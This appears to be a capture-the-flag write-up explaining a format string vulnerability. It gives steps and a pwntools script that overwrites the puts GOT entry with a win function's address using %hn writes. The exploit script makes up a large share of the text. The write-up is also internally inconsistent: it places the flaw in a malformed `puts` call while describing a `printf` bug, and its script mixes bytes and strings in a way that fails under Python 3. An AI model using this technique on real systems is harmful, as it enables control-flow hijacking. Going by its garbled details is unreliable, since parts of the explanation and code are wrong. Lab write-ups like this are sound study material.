# Challenge `Calling_functions_again` Writeup

- **Vulnerability**: Format String Vulnerability
  - This type of vulnerability occurs when a program uses user input as a format string for `printf` or similar functions without proper sanitization, allowing an attacker to read from or write to memory addresses.

- **Where**: The vulnerability is present in the `puts` function call within the `vuln` function in the provided C program.
  - Specifically, `puts("Bye!));` 

- **Impact**: By exploiting this vulnerability, an attacker can execute arbitrary code. In this challenge, it allows for the redirection of the program's flow to the `win` function, potentially enabling unauthorized actions, such as reading a file that should be restricted.

- **NOTE**: The challenge demonstrates the importance of proper input validation and the dangers of using untrusted input in sensitive functions. It's a classic example of a format string vulnerability that leads to arbitrary code execution.

## Steps to Reproduce

1. Analyze the provided C code to identify the format string vulnerability in the `printf` function call.
2. Use tools like `pwndbg` to find the addresses of `puts@GOT` and the `win` function.
3. Craft a payload that overwrites the GOT entry for `puts` with the address of `win`. This involves splitting the `win` address into two parts and calculating the number of bytes to write before each part.
4. Adjust the payload format to write the lower 16 bits of the `win` address first, followed by the higher 16 bits, using `%hn` to write only 2 bytes at a time.
5. Ensure the payload aligns with the stack layout of the program, modifying the format specifiers indices (`%7$hn` and `%8$hn`) as needed.
6. Send the crafted payload to the vulnerable program.
7. The program's execution flow is redirected to the `win` function when `puts` is called, demonstrating successful exploitation.

### Python Payload Script

The following Python script demonstrates how to generate and send the payload:

```python
from pwn import *

# Addresses
puts_got = 0x804c018
win = 0x8049216

# Split the win address into two parts
win_low = win & 0xffff
win_high = (win >> 16) & 0xffff

# Create the payload
# Write the lower half first, then the higher half
payload = p32(puts_got)
payload += p32(puts_got + 2)

# Calculate the number of bytes to write
# Account for the 8 bytes already written by the addresses
count_low = win_low - 8
count_high = win_high - win_low

# Ensure the counts are positive
if count_high < 0:
    count_high += 0x10000

payload += "%{}c%7$hn".format(count_low)
payload += "%{}c%8$hn".format(count_high)

# Send the payload
# Assuming you have a function to send the payload to the vulnerable program
print(payload)
```
This script creates a payload that first writes the lower 16 bits of the `win` address to the GOT entry of `puts`, then writes the higher 16 bits. The `%hn` format specifier is used to write only 2 bytes at a time, and the `%c` format specifier is used to control the number of bytes written. The indices `%7$hn` and `%8$hn` are used to correctly position the writes in the GOT.
